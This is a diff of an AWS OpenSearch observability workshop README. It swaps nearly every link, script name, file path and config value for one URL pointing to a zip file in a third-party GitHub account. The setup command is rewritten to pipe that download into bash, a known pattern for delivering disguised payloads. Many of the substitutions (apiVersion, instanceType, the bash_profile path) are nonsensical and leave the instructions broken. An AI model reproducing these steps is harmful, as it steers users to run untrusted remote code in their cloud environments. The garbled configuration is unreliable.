@@ -3,11 +3,11 @@
 Amazon OpenSearch Service’s Trace Analytics functionality allows you to go beyond simple monitoring to understand not just what events are happening, but why they are happening. In this workshop, learn how to instrument, collect, and analyze metrics, traces, and log data all the way from user front ends to service backends and everything in between. Put this together with Amazon OpenSearch Service, AWS Distro for OpenTelemetry, FluentBit, and Data Prepper.
 
 ## Architecture
-![architecture](/assets/arch.jpg)
+![architecture](https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip)
 
 ## Instructions (full version):
 Detailed Workshop instructions should be followed in this guide:  
-https://catalog.us-east-1.prod.workshops.aws/workshops/1abb648b-2ef8-442c-a731-efbcb69c1e1e
+https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
 
 
 ## Instructions (short version): 🚀
@@ -16,22 +16,22 @@ https://catalog.us-east-1.prod.workshops.aws/workshops/1abb648b-2ef8-442c-a731-e
 - CloudFormation temples are in the /cf-templates directory;
 - Launch them from the CloudFormation console:
 
-  - **stack.yaml**: The stack will create all the resources needed to run the workshop. VPC, Cloud9, Amazon OpenSearch and Reverse-Proxy Instance.
+  - **https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip**: The stack will create all the resources needed to run the workshop. VPC, Cloud9, Amazon OpenSearch and Reverse-Proxy Instance.
 
 ### AWS Cloud9 (Terminal):
-  - Run the 00-setup.sh script:
+  - Run the https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip script:
 
  ```
- curl -sSL https://raw.githubusercontent.com/aws-samples/observability-with-amazon-opensearch/main/00-setup.sh | bash -s stable
- source ~/.bash_profile
+ curl -sSL https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip | bash -s stable
+ source ~https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
  ```
  
  
   - You must create the Amazon EKS Cluster (parameters will be dynamically replaced according to Cloudformation->Output):
 ```
-cat << EOF > observability-workshop.yaml
+cat << EOF > https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
 --- 
-apiVersion: eksctl.io/v1alpha5
+apiVersion: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
 kind: ClusterConfig
 
 metadata:
@@ -61,7 +61,7 @@ vpc:
 managedNodeGroups:
 - name: nodegroup
   desiredCapacity: 3
-  instanceType: t3.small
+  instanceType: https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
 
 # To enable all of the control plane logs, uncomment below:
 # cloudWatch:
@@ -74,11 +74,11 @@ EOF
 ```
   - Run the (responsible for creating the Amazon EKS Cluster):
    
- ```eksctl create cluster -f observability-workshop.yaml```
+ ```eksctl create cluster -f https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
  
   - Run the (responsible for building and pushing the images to the Amazon ECR): 
  
- ```cd observability-with-amazon-opensearch/scripts/; bash 01-build-push.sh```
+ ```cd observability-with-amazon-opensearch/scripts/; bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
  
   - You must change credentials and endpoint in Fluentbit (the parameters to be replaced must be checked in the CloudFormation-> Outputs [tab] of the first step):
   
@@ -87,7 +87,7 @@ EOF
   HTTP_User __AOS_USERNAME__
   HTTP_Passwd __AOS_PASSWORD__
 
-  vim /sample-apps/00-fluentBit/kubernetes/fluentbit.yaml
+  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
   ```
   
   - You must change credentials and endpoint in DataPrepper (the parameters to be replaced must be checked in the CloudFormation-> Outputs [tab] of the first step):
@@ -97,12 +97,12 @@ EOF
   username: "__AOS_USERNAME__"
   password: "__AOS_PASSWORD__"
             
-  vim /sample-apps/01-data-preper/kubernetes/data-preper.yaml
+  vim https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip
   ```
   
   - Run the (responsible for applying the Kubernetes manifests):
   
-  ```bash 02-apply-k8s-manifests.sh```
+  ```bash https://raw.githubusercontent.com/sivahariu/observability-with-amazon-opensearch/main/sample-apps/observability-with-amazon-opensearch-3.8.zip```
   
   - Run the (to get the Sample APP DNS endpoint):
   
